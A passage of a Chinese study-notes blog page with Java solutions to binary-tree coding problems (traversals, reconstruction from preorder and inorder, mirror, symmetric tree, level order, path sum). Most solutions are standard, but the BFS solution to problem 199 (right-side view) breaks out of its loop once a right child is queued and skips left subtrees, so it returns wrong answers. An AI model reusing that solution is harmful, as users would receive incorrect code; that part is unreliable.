&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                dp[i] += dp[j]*dp[i - j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="NC45-实现二叉树的先序-中序-后序遍历"><a href="#NC45-实现二叉树的先序-中序-后序遍历" class="headerlink" title="NC45 实现二叉树的先序,中序,后序遍历"></a><a href="https://www.nowcoder.com/practice/a9fec6c46a684ad5a3abd4e365a9d362?tpId=117&companyId=665&rp=1&ru=%252Fcompany%252Fhome%252Fcode%252F665&qru=%252Fta%252Fjob-code-high%252Fquestion-ranking&tab=answerKey">NC45 实现二叉树的先序,中序,后序遍历</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] threeOrders (TreeNode root) &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        ArrayList&lt;Integer&gt; pre = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        ArrayList&lt;Integer&gt; in = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        ArrayList&lt;Integer&gt; post = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        preOrder(root, pre);</span><br><span class="line">        inOrder(root, in);</span><br><span class="line">        postOrder(root, post);</span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][pre.size()];</span><br><span class="line">        res[<span class="number">0</span>] = pre.stream().mapToInt(Integer::valueOf).toArray();</span><br><span class="line">        res[<span class="number">1</span>] = in.stream().mapToInt(Integer::valueOf).toArray();</span><br><span class="line">        res[<span class="number">2</span>] = post.stream().mapToInt(Integer::valueOf).toArray();</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">postOrder</span><span class="params">(TreeNode root, ArrayList&lt;Integer&gt; post)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        postOrder(root.left, post);</span><br><span class="line">        postOrder(root.right, post);</span><br><span class="line">        post.add(root.val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">inOrder</span><span class="params">(TreeNode root, ArrayList&lt;Integer&gt; in)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        inOrder(root.left, in);</span><br><span class="line">        in.add(root.val);</span><br><span class="line">        inOrder(root.right, in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">(TreeNode root, ArrayList&lt;Integer&gt; pre)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pre.add(root.val);</span><br><span class="line">        preOrder(root.left, pre);</span><br><span class="line">        preOrder(root.right, pre);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-07-重建二叉树"><a href="#剑指-Offer-07-重建二叉树" class="headerlink" title="剑指 Offer 07. 重建二叉树"></a><a href="https://leetcode-cn.com/problems/zhong-jian-er-cha-shu-lcof/">剑指 Offer 07. 重建二叉树</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">int</span>[] preorder;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span>[] inorder)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.preorder = preorder;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; inorder.length; i++) &#123;</span><br><span class="line">            map.put(inorder[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> recursive(<span class="number">0</span>, <span class="number">0</span> , inorder.length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">recursive</span><span class="params">(<span class="type">int</span> pre_root_idx, <span class="type">int</span> in_left_idx, <span class="type">int</span> in_right_idx)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_left_idx &gt; in_right_idx) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(preorder[pre_root_idx]);</span><br><span class="line">        <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> map.get(preorder[pre_root_idx]);</span><br><span class="line">        root.left = recursive(pre_root_idx + <span class="number">1</span>, in_left_idx, idx - <span class="number">1</span>);</span><br><span class="line">        root.right = recursive(pre_root_idx + idx - in_left_idx + <span class="number">1</span>, idx + <span class="number">1</span>, in_right_idx);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-26-树的子结构"><a href="#剑指-Offer-26-树的子结构" class="headerlink" title="剑指 Offer 26. 树的子结构"></a><a href="https://leetcode-cn.com/problems/shu-de-zi-jie-gou-lcof/">剑指 Offer 26. 树的子结构</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个辅助函数判断两棵树是否相等2.递归遍历A树的每一个节点作为根结点和B树进行比较</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSubStructure</span><span class="params">(TreeNode A, TreeNode B)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (A == <span class="literal">null</span> || B == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dfs(A, B) || isSubStructure(A.left, B) || isSubStructure(A.right, B);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(TreeNode a, TreeNode b)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a.val == b.val &amp;&amp; dfs(a.left, b.left) &amp;&amp; dfs(a.right, b.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-55-II-平衡二叉树"><a href="#剑指-Offer-55-II-平衡二叉树" class="headerlink" title="剑指 Offer 55 - II. 平衡二叉树"></a><a href="https://leetcode-cn.com/problems/ping-heng-er-cha-shu-lcof/">剑指 Offer 55 - II. 平衡二叉树</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isBalanced</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Math.abs(getHigh(root.left) - getHigh(root.right)) &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> isBalanced(root.left) &amp;&amp; isBalanced(root.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getHigh</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(getHigh(root.left), getHigh(root.right)) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-27-二叉树的镜像"><a href="#剑指-Offer-27-二叉树的镜像" class="headerlink" title="剑指 Offer 27. 二叉树的镜像"></a><a href="https://leetcode-cn.com/problems/er-cha-shu-de-jing-xiang-lcof/">剑指 Offer 27. 二叉树的镜像</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 递归</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">mirrorTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left = mirrorTree(root.right);</span><br><span class="line">        root.right = mirrorTree(tmp);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 队列</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">mirrorTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">            <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                queue.add(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                queue.add(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> node.left;</span><br><span class="line">            node.left = node.right;</span><br><span class="line">            node.right = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="103-二叉树的锯齿形层序遍历"><a href="#103-二叉树的锯齿形层序遍历" class="headerlink" title="103. 二叉树的锯齿形层序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-zigzag-level-order-traversal/">103. 二叉树的锯齿形层序遍历</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">zigzagLevelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                    list.add(node.val);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    list.add(<span class="number">0</span>, node.val);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            flag = !flag;</span><br><span class="line">            res.add(list);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="199-二叉树的右视图"><a href="#199-二叉树的右视图" class="headerlink" title=" 199. 二叉树的右视图"></a><a href="https://leetcode-cn.com/problems/binary-tree-right-side-view"> 199. 二叉树的右视图</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// BFS</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">rightSideView</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                    res.add(node.val);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//dfs</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">rightSideView</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        dfs(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(TreeNode root, <span class="type">int</span> depth)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (depth == res.size()) &#123;</span><br><span class="line">            res.add(root.val);</span><br><span class="line">        &#125;</span><br><span class="line">        depth++;</span><br><span class="line">        dfs(root.right, depth);</span><br><span class="line">        dfs(root.left, depth);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="105-从前序与中序遍历序列构造"><a href="#105-从前序与中序遍历序列构造" class="headerlink" title="105. 从前序与中序遍历序列构造"></a><a href="https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal">105. 从前序与中序遍历序列构造</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 递归</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; inMap;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span>[] inorder)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> preorder.length;</span><br><span class="line">        inMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            inMap.put(inorder[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> myBuildTree(preorder, <span class="number">0</span>, n - <span class="number">1</span>, inorder, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">myBuildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span> pre_left, <span class="type">int</span> pre_right, <span class="type">int</span>[] inorder, <span class="type">int</span> in_left, <span class="type">int</span> in_right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (pre_left &gt; pre_right) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(preorder[pre_left]);</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> inMap.get(preorder[pre_left]);</span><br><span class="line">        root.left = myBuildTree(preorder, pre_left + <span class="number">1</span>, pre_left + index - in_left  , inorder, in_left, index - <span class="number">1</span>);</span><br><span class="line">        root.right = myBuildTree(preorder, pre_left + index - in_left+<span class="number">1</span>, pre_right, inorder, index + <span class="number">1</span>, in_right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="102-二叉树的层序遍历-x2F-x2F"><a href="#102-二叉树的层序遍历-x2F-x2F" class="headerlink" title="102. 二叉树的层序遍历&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal">102. 二叉树的层序遍历</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                list.add(node.val);</span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            res.add(list);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="101-对称二叉树-x2F"><a href="#101-对称二叉树-x2F" class="headerlink" title=" 101. 对称二叉树&#x2F;"></a><a href="https://leetcode-cn.com/problems/symmetric-tree"> 101. 对称二叉树</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> helper(root, root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">helper</span><span class="params">(TreeNode root, TreeNode root1)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span> &amp;&amp; root1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span> &amp;&amp; root1 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">null</span> &amp;&amp; root1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root.val == root1.val &amp;&amp; helper(root.left, root1.right) &amp;&amp; helper(root.right, root1.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="94-二叉树的中序遍历"><a href="#94-二叉树的中序遍历" class="headerlink" title="94. 二叉树的中序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal">94. 二叉树的中序遍历</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基于栈， 一直往左走，然后出栈一个就进入右子树</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty() || cur != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (cur != <span class="literal">null</span>) &#123;</span><br><span class="line">                stack.push(cur);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = stack.pop();</span><br><span class="line">            res.add(cur.val);</span><br><span class="line">            cur = cur.right;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 递归</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">       inorder(root, res);</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">inorder</span><span class="params">(TreeNode root, List&lt;Integer&gt; res)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        inorder(root.left, res);</span><br><span class="line">        res.add(root.val);</span><br><span class="line">        inorder(root.right, res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="113-路径总和-II"><a href="#113-路径总和-II" class="headerlink" title=" 113. 路径总和 II"></a><a href="https://leetcode-cn.com/problems/path-sum-ii"> 113. 路径总和 II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">pathSum</span><span class="params">(TreeNode root, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        dfs(root, res, path, targetSum);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(TreeNode root, List&lt;List&lt;Integer&gt;&gt; res, List&lt;Integer&gt; path, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        path.add(root.val);</span><br><span class="line">        targetSum -= root.val;</span><br><span class="line">        <span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span> &amp;&amp; targetSum == <span class="number">0</span>) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(root.left, res, path, targetSum);</span><br><span class="line">        dfs(root.right, res, path, targetSum);</span><br><span class="line">        path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">    